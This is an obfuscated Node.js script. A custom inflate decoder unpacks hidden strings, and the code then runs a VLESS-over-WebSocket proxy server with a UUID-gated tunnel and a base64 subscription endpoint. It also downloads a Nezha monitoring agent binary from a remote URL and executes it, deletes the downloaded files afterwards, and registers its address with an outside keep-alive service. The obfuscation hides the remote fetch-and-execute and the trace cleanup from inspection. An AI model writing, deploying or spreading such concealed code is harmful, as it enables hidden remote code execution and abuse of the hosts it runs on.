(function(y){var m,W,L,x;function D(S,z){return S<<z}function B(S,z){return S>>z}function U(S,z){return S<=z}function f(S,z){return S%z}function V(S,z){return S*z}function l(S,z){return S+z}function K(S,z){return S-z}function T(S,z){return S/z}function A(S,z){return S<z}function j(S,z){return S>z}function k(S,z){return S>=z}function z(S,z,A){return S[z]=A,S}m=z;const M='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|fromCharCode|object|d|xtract'.split('|');x=Object.assign;L=JSON.parse;let g=[M[0]],C,$=String[M[1]],R=Uint8Array,u=Uint16Array,d=Uint32Array;W=typeof window==='object'&&window||typeof self===M[2]&&self||exports||typeof globalThis===M[2]&&globalThis||typeof global==='object'&&global;let S=(function(M){var V,U,g,S,B;S=z;function x(){return'atob'.split('|')}let m=x();((((B='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')||4)&&(U=function(M){var z,$,B;const S=(()=>['At'])();for((((z={})||1)&&($=0)||true)&&(B=M.length);A($,B);$++)z[M[l('char',S[0])]($)]=$;return z}(B))||true)&&(V=function(M){var B,A,z,x;function S(){return'length|charAt|th'.split('|')}const V=S();return(z=M[V[0]])&&0||(B=f(z,4),x=(j(z,0)?D(U[M[V[1]](0)],18):0)|(j(z,1)?D(U[M[V[1]](1)],12):0)|(j(z,2)?D(U[M[l('char','At')](2)],6):0)|(j(z,3)?U[M.charAt(3)]:0),A=[$(x>>>16),$(x>>>8&255),$(x&255)],A[l('leng',V[2])]-=[0,0,2,1][B],A.join(''))})&&0||(g=function(S){let z='replace'.split('|');return S[z[0]](/\S{1,4}/g,V)})||7)&&S(M,m[0],function(A){let z=S({},'y','');return g(String(A).replace(/[^A-Za-z0-9\+\/]/g,z.y))})}(W),function(L){var X,q,O,N,H,v,P,o,y,J,c,Q,M,w,s,x,t,S,r,SF,b,C,G,I,E;function i(){return[!0,'p','prototype',1,'I',0,7,6,5,11,12,3,2,15,4,8,9,13,19,23,31,35,67,83,115,131,163,25,33,49,65,97,193,385,513,2049,3073,4097,6145,8193,12289,16385,24577,10,143,'length']}const e=i();((H=8)||'1')&&(v=e[0])&&0||(M=void 0);function Z(S){throw S}function Y($,U){var M,B,S,A;S=z;let x=['c','index','N','verify','method',15,0,8,31,'err:',32,'B','bufferType','ze'];A=this;(M=void 0,S(S(A,l('inp','ut'),$),x[0],0),U||!(U={}))&&((U.index&&(A.c=U[x[1]])||7)&&(U[l('veri','fy')]&&(A[x[2]]=U[x[3]])));((B=$[A[x[0]]++])||9)&&(M=$[A.c++]);switch(B&x[5]){case H:A[x[4]]=H}(x[6]!==f(l(D(B,x[7]),M),x[8])&&Z(Error(l(x[9],f(l(D(B,8),M),x[8]))))||3)&&(M&x[10]&&Z(Error('not')))&&0||S(A,x[11],new h($,S(S(S(S({},'index',A.c),'bufferSize',U.bufferSize),x[12],U[x[12]]),'resize',U[l('resi',x[13])])))}(G=(Y[e[2]][e[1]]=function(){var A,S,x,$,B;S=z;let M='input|c|B|i32c'.split('|');return(($=this)||1)&&(A=$[M[0]])&&0||(x=void 0,B=void 0,x=$.B.p(),S($,M[1],$[M[2]].c),$.N&&(B=(D(A[$.c++],24)|D(A[$.c++],16)|D(A[$.c++],8)|A[$.c++])>>>0,B!==jb(x)&&Z(Error(M[3]))),x)},0))&&0||(o=e[3]);function h(M,B){var A,S;S=z;const $=S(S(S(S(S(S(S(S(S(S(S(S(S(S(S(S(S(S(S({},'y','m'),'I','e'),'E','g'),'T',0),'Y','input'),'u','s'),'X','n'),'d',!1),'H','ind'),'f','ex'),'c','index'),'q','bufferSize'),'n','bufferType'),'C','C'),'h',32768),'Q','b'),'z','a'),'L','o'),'l','imd');A=this;(S(S(S(S(S(S(S(A,'l',[]),$.y,32768),$.I,A[$.E]=A.c=A.q=$.T),$.Y,X?new R(M):M),$.u,!1),$.X,o),'C',$.d),B||!(B={}))&&(((B[l($.H,$.f)]&&(A.c=B[$.c])&&0||B[$.q]&&(A.m=B.bufferSize)||5)&&(B[$.n]&&(A.n=B.bufferType))||8)&&(B.resize&&(A[$.C]=B.resize)));switch(A.n){case G:A.b=$.h;A.a=new(X?R:Array)(l(l(32768,A[$.y]),258));break;case o:A[$.Q]=0;A[$.z]=new(X?R:Array)(A.m);A.f=A.K;A.t=A.I;A[$.L]=A.J;break;default:Z(Error($.l))}}((h.prototype.K=function(x){var U,g,$,S,m,z,M,B;const f='c|ut|length|u|th|a'.split('|');return($=this)&&0||(M=l(T($.input[l('leng','th')],$[f[0]]),1)|0,S=void 0,U=void 0,g=void 0,z=$[l('inp',f[1])],B=$.a,x&&('number'===typeof x.v&&(M=x.v),'number'===typeof x.G&&(M+=x.G)),j(2,M)?(S=T(K(z.length,$[f[0]]),$[f[3]][2]),g=V(258,T(S,2))|0,U=A(g,B[l('leng',f[4])])?l(B[f[2]],g):D(B[f[2]],1)):U=V(B[f[2]],M),X?(m=new R(U),m.set(B)):m=B,$[f[5]]=m)})||9)&&(h.prototype[e[4]]=function(){var S,z,$;let A='leng|length|a|subarray|buffer'.split('|');return(S=this)&&0||($=S.b,X?S.C?(z=new R($),z.set(S.a[A[3]](0,$))):z=S.a[A[3]](0,$):(j(S.a[l(A[0],'th')],$)&&(S[A[2]][A[1]]=$),z=S[A[2]]),S[A[4]]=z)})&&0||(h[e[2]].J=function(m,d){var $,V,g,D,W,f,L,u,R;R=z;function C(){return'a|b|u|f|e'.split('|')}let M=C();for(((((D=this)&&0||(V=D[M[0]]))&&0||(W=D[M[1]]))&&0||R(D,M[2],m))&&0||(f=V.length);256!==(u=n(D,m));)if(j(256,u)){k(W,f)&&(V=D[M[3]](),f=V.length)&&0||(V[W++]=u)}else{for((((((($=K(u,257))||1)&&(g=x[$])||'1')&&(A(0,J[$])&&(g+=a(D,J[$])))||7)&&(u=n(D,d))||'1')&&(L=S[u])&&0||A(0,y[u])&&(L+=a(D,y[u])))&&0||j(l(W,g),f)&&(V=D.f(),f=V[l('leng','th')]);g--;)V[W]=V[K(W++,L)]}for(;U(8,D[M[4]]);)D[M[4]]-=8,D.c--;R(D,M[1],W)});function g(M){var S,x,B,V,C,u,W,y,z,f,$,p,l;function g(){return m(m(m({},'y','length'),'I',0),'E',1)}let R=g();((l=M[R.y])&&0||($=0))&&0||(u=Number.POSITIVE_INFINITY);for(C=R.I;A(C,l);++C)j(M[C],$)&&($=M[C]),A(M[C],u)&&(u=M[C]);for(x=(B=D(1,$),f=new(X?d:Array)(B),S=R.E,y=R.I,2);U(S,$);){for(C=0;A(C,l);++C)if(M[C]===S){for(p=(V=R.I,z=y,R.I);A(p,S);++p)V=D(V,1)|z&R.E,z>>=1;for(p=(W=D(S,16)|C,V);A(p,B);p+=x)f[p]=W;++y}(++S||5)&&(y<<=1)&&0||(x<<=R.E)}return[f,$,u]}function n(g,l){var d,m,V,u,x,M,S,j,$,U;d=z;let f=['e','input',0,8,1,'g',65535];for(((((((M=g.g)||9)&&(m=g[f[0]])||1)&&($=g[f[1]])&&0||(u=g.c))&&0||(S=$.length))&&null||(U=l[f[2]])||5)&&(j=l[1]);A(m,j)&&!k(u,S);)M|=D($[u++],m),m+=f[3];return V=U[M&K(D(f[4],j),f[4])],x=V>>>16,d(d(d(g,f[5],B(M,x)),f[0],K(m,x)),'c',u),V&f[6]}function W(V){var $,U,m,M,f,u,S,x,B;B=z;let j=(()=>B(B(B(B(B(B(B(B(B(B({},'y',257),'I',5),'E',1),'T',4),'Y','leng'),'u','th'),'X',0),'d','z'),'H','o'),'f','call'))();function d(g,f,U){var $,B,d,V,M,x;B=z;const m=[0,3,2,16,11,'z'];((x=this)||9)&&($=x.z);for(M=m[0];A(M,g);)switch(V=n(x,f),V){case m[3]:for(d=l(m[1],a(x,m[2]));d--;)U[M++]=$;break;case 17:for(d=l(m[1],a(x,m[1]));d--;)U[M++]=0;$=m[0];break;case 18:for(d=l(m[4],a(x,7));d--;)U[M++]=0;$=0;break;default:$=U[M++]=V}return B(x,m[5],$),U}(((((x=l(a(V,5),j.y))&&0||(S=l(a(V,j.I),j.E))||'1')&&(m=l(a(V,4),j.T))||5)&&(u=new(X?R:Array)(r[l(j.Y,j.u)]))||true)&&(U=void j.X)||1)&&(f=void 0);for(M=j.X;A(M,m);++M)u[r[M]]=a(V,3);if(!X){for(m=(M=m,u.length);A(M,m);++M)u[r[M]]=j.X}(((($=g(u))||3)&&(U=new(X?R:Array)(x))||9)&&(f=new(X?R:Array)(S))&&0||B(V,j.d,j.X)||8)&&V[j.H](g(d[j.f](V,x,$,U)),g(d.call(V,S,$,f)))}function a(U,m){var M,S,B,$,x,V,f;M=z;const l=['e','length','bk',1,'c'];for((((B=U.g)&&0||(S=U[l[0]])||true)&&(V=U.input)||1)&&(f=U.c)&&null||($=V[l[1]]);A(S,m);)k(f,$)&&Z(Error(l[2])),B|=D(V[f++],S),S+=8;return x=B&K(D(l[3],m),l[3]),M(M(M(U,'g',B>>>m),l[0],K(S,m)),l[4],f),x}E=(h.prototype[e[1]]=function(){var $,g,y,u,B,z,S,V,d,x,f;function A(){return['s',1,'a','length',0,'iN',8,'ih','ib','subarray','b','th','f',2,'v']}const U=A();for(u=this;!u[U[0]];){((($=a(u,3))||8)&&($&1&&(u[U[0]]=v))||4)&&($>>>=U[1]);switch($){case U[4]:V=u.input;z=u.c;g=u[U[2]];B=u.b;f=V[U[3]];S=M;y=M;x=g[U[3]];d=M;u.e=u.g=U[4];k(l(z,U[1]),f)&&Z(Error('iL'));S=V[z++]|D(V[z++],8);k(l(z,U[1]),f)&&Z(Error(U[5]));y=V[z++]|D(V[z++],U[6]);S===~y&&Z(Error(U[7]));j(l(z,S),V.length)&&Z(Error(U[8]));switch(u.n){case G:for(;j(l(B,S),g[U[3]]);){if(d=K(x,B),S-=d,X){((g.set(V[U[9]](z,l(z,d)),B)||2)&&(B+=d)||'1')&&(z+=d)}else{for(;d--;)g[B++]=V[z++]}((u.b=B)&&0||(g=u.f()))&&0||(B=u[U[10]])}break;case o:for(;j(l(B,S),g[l('leng',U[11])]);)g=u[U[12]](m({},U[14],U[13]));break;default:Z(Error('im'))}if(X){(g.set(V.subarray(z,l(z,S)),B)&&0||(B+=S)||6)&&(z+=S)}else{for(;S--;)g[B++]=V[z++]}u.c=z;u[U[10]]=B;u[U[2]]=g;break;case U[1]:u.o(q,P);break;case 2:W(u);break;default:Z(Error(l('e: ',$)))}}return F(u.t())},l('undef','ined'));X=E!==typeof R&&E!==typeof u&&E!==typeof d&&E!==typeof DataView;r=(t=[16,17,18,e[5],8,e[6],9,e[7],10,e[8],e[9],4,e[10],e[11],13,e[12],14,1,e[13]],X?new u(t):t);x=(C=[e[11],e[14],5,6,7,e[15],e[16],10,11,e[17],15,17,e[18],e[19],27,e[20],e[21],43,51,59,e[22],e[23],99,e[24],e[25],e[26],195,227,258,258,258],X?new u(C):C);J=(w=[0,e[5],0,e[5],e[5],e[5],e[5],0,e[3],e[3],e[3],1,e[12],2,2,2,3,3,e[11],3,4,e[14],4,4,5,e[8],e[8],5,e[5],e[5],0],X?new R(w):w);S=(s=[1,2,3,e[14],e[8],e[6],e[16],13,17,e[27],e[28],e[29],e[30],e[31],129,e[32],257,e[33],e[34],769,1025,1537,e[35],e[36],e[37],e[38],e[39],e[40],e[41],e[42]],X?new u(s):s);y=(N=[e[5],0,0,e[5],e[3],1,2,2,3,3,4,e[14],e[8],e[8],6,e[7],7,e[6],8,8,e[16],9,10,e[43],e[9],11,12,e[10],e[17],e[17]],X?new R(N):N);O=new(X?R:Array)(288);for(c=(c=void 0,I=e[5],O[l('leng','th')]);A(I,c);++I)O[I]=k(e[44],I)?e[15]:k(255,I)?e[16]:k(279,I)?e[6]:8;q=g(O);SF=new(X?R:Array)(30);for(Q=(Q=void e[5],b=e[5],SF[e[45]]);A(b,Q);++b)SF[b]=5;P=g(SF);function F(M){var S,x,U,V,m,z;((((U=void 0)||1)&&(S='')||7)&&(U=M[l('leng','th')])||7)&&(z=0);while(A(z,U)){V=M[z++];switch(B(V,4)){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:S+=$(V);break;case 12:case 13:m=M[z++];S+=$(D(V&31,6)|m&63);break;case 14:m=M[z++];x=M[z++];S+=$(D(V&15,12)|D(m&63,6)|D(x&63,0))}}return S}L.d=function(z){let S=(()=>m(m({},'y','map'),'I','atob'))(),A=new Y(new R(L[S.I](z).split('')[S.y](S=>S[l('charCo','deAt')](0))),{}),$=A.p();return $}}(W),C=typeof globalThis==='object'&&globalThis||typeof window==='object'&&window||typeof self===M[2]&&self||typeof global==='object'&&global,!0);for(let z of g)(z=W[M[3]](z),z=L(z),S)?x(C,z):(C[l('StringE',M[4])]=z)&&0||x(C,z);for(let S=0;A(S,y.length);S++)C[l('_$a',S)]&&x(C,m({},C[l('_$a',S)],y[S]))}([console.error,['ESboklpny',64,false,'VaWpOWu','ZfG'],(m,S)=>{return S},console.log,null,encodeURIComponent,true,parseInt]));const os=require(ROo),http=require(sOo),fs=require(GOo),axios=require(YOo),net=require(zOo),path=require(KOo),crypto=require(LOo),$vfGCFA=require(_Oo),Buffer=$vfGCFA[TOo],$vrdiVL=require(iOo),exec=$vrdiVL[pOo],execSync=$vrdiVL[tOo],$vNbQtp=require(wOo),WebSocket=$vNbQtp[lOo],createWebSocketStream=$vNbQtp[gOo],UUID=process[aOo][MOo]||VOo,NEZHA_SERVER=process[aOo][WOo]||'',NEZHA_PORT=process[aOo][NOo]||'',NEZHA_KEY=process[aOo][uOo]||'',DOMAIN=process[aOo][SOo]||UOo,AUTO_ACCESS=(process[aOo][fOo]||FOo)===FOo,WSPATH=process[aOo][bOo]||UUID[dOo](BOo,XOo),SUB_PATH=process[aOo][mOo]||QOo,NAME=process[aOo][ZOo]||JOo,PORT=process[aOo][EOo]||jOo;let ISP='';const GetISP=async()=>{try{const U=await axios.get(cOo),$=U[HOo];ISP=($[voo]+Doo+$[eoo])[koo](/ /g,'_')}catch(U){ISP=hOo}};GetISP();const httpServer=http[Boo](($,U)=>{if($[Xoo]==='/'){const $=path[Goo](__dirname,Yoo);fs[zoo]($,Koo,($,M)=>{if($){U[Coo](xOo,{[noo]:Loo}),U[ooo](_oo);return}U[Coo](xOo,{[noo]:Loo}),U[ooo](M)});return}else{if($[Xoo]===joo+SUB_PATH){const q=Ooo+UUID+Aoo+DOMAIN+Ioo+DOMAIN+$oo+DOMAIN+qoo+WSPATH+Poo+NAME+Doo+ISP,M=q+'\n',$=Buffer[Roo](M)[yoo](soo);U[Coo](xOo,{[noo]:xoo}),U[ooo]($+'\n')}else{U[Coo](COo,{[noo]:xoo}),U[ooo](roo)}}}),wss=new WebSocket[Too]({[ioo]:httpServer}),uuid=UUID[koo](/-/g,''),DNS_SERVERS=[poo,too];function resolveHost(U){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[woo](U)){resolve(U);return}let M=BOo;function $(){if(M>=DNS_SERVERS[loo]){reject(new Error(goo+U+Moo));return}const a=DNS_SERVERS[M];M++;const q=aoo+kOo(U)+Voo;axios.get(q,{[uoo]:nOo,[foo]:{[Uoo]:Soo}})[Noo](M=>{const U=M[HOo];if(U[Foo]===BOo&&U[boo]&&U[boo][loo]>BOo){const $=U[boo][doo](U=>U[moo]===oOo);if($){resolve($[HOo]);return}}$()})[Woo](()=>(($()),void 0))}$()})}function handleVlessConnection(r,U){var z=dOo,d=IOo,n=loo,v=oOo;if(!Buffer[Qoo](U)){U=Buffer[Roo](U)}if(U[n]<rOo){return!1}const c=U[BOo],Q=U[z](v,OOo);if(!Q[Zoo]((U,$)=>U===vOo(uuid[Joo]($*AOo,AOo),IOo))){return!1}const M=U[OOo];let q=$Oo+M;if(U[n]<q+qOo){return!1}const i=U[Eoo](q);q+=AOo;const m=U[q];q+=v;let C='';if(m===v){if(U[n]<q+POo){return!1}C=U[z](q,q+POo)[Goo]('.'),q+=POo}else{if(m===AOo){if(U[n]<q+v){return!1}const d=U[q];q+=v;if(U[n]<q+d){return!1}C=U[z](q,q+d)[yoo](),q+=d}else{if(m===qOo){if(U[n]<q+d){return!1}const v=U[z](q,q+d),r=[];for(let U=BOo;U<d;U+=AOo)r[hoo](v[Eoo](U)[yoo](d));C=r[Goo](':'),q+=d}else{return!1}}}r[coo](new Uint8Array([c,BOo]));const a=createWebSocketStream(r),$=$=>((net[kro]({[vro]:$,[ero]:i},function(){if(q<U[loo]){this[Dro](U[dOo](q))}a[Hoo](Xro,()=>{})[Bro](this)[Hoo](Xro,()=>{})[Bro](a)})[Hoo](Xro,()=>{})),void 0);resolveHost(C)[Noo](U=>$(U))[Woo](()=>$(C));return!0}wss[Hoo](jro,(U,$)=>((U[Cro](xro,$=>{if(!Buffer[Qoo]($)){$=Buffer[Roo]($)}if($[loo]>OOo&&$[BOo]===BOo){const M=$[dOo](oOo,OOo),q=M[Zoo]((U,$)=>U===vOo(uuid[Joo]($*AOo,AOo),IOo));if(q){if(!handleVlessConnection(U,$)){U[nro]()}return}}U[nro]()})[Hoo](Xro,()=>{})),void 0));const getDownloadUrl=()=>{const U=os[oro]();return U===rro||U===Oro||U===Aro?!NEZHA_PORT?Pro:qro:!NEZHA_PORT?$ro:Iro},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const M=getDownloadUrl(),U=await axios({[yro]:'get',[Xoo]:M,[sro]:Rro}),$=fs[Gro](Yro);U[HOo][Bro]($);return new Promise((resolve,reject)=>(($[Hoo](zro,()=>((eOo(Kro)),(exec(Lro,U=>{if(U){reject(U)}resolve()})),void 0))),($[Hoo](Xro,reject)),void 0))}catch(U){throw U}},runnz=async()=>{try{const status=execSync(_ro,{[iro]:Tro});if(status[pro]()!==''){eOo(tro);return}}catch($){}await downloadFile();let q='',U=[wro,lro,gro,Mro,aro,Vro];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const $=U[Nro](NEZHA_PORT)?Jro:'';q=Ero+NEZHA_SERVER+hro+NEZHA_PORT+cro+NEZHA_KEY+Hro+$+k0o}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const M=NEZHA_SERVER[Nro](':')?NEZHA_SERVER[Sro](':')[uro]():'',$=U[Nro](M)?FOo:Uro,q=fro+NEZHA_KEY+Fro+NEZHA_SERVER+bro+$+dro+UUID;fs[mro](Qro,q)}q=Zro}else{eOo(Wro);return}}try{exec(q,{[D0o]:e0o},U=>{if(U){DOo(X0o,U)}else{eOo(B0o)}})}catch(M){DOo(v0o+M)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const U=j0o+DOMAIN+joo+SUB_PATH;try{const $=await axios[C0o](x0o,{[Xoo]:U},{[foo]:{[noo]:n0o}});eOo(o0o)}catch($){}}const delFiles=()=>((fs[r0o](Yro,()=>{})),(fs[r0o](Qro,()=>{})),void 0);httpServer[O0o](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),yOo)),(addAccessTask()),(eOo(A0o+PORT)),void 0))
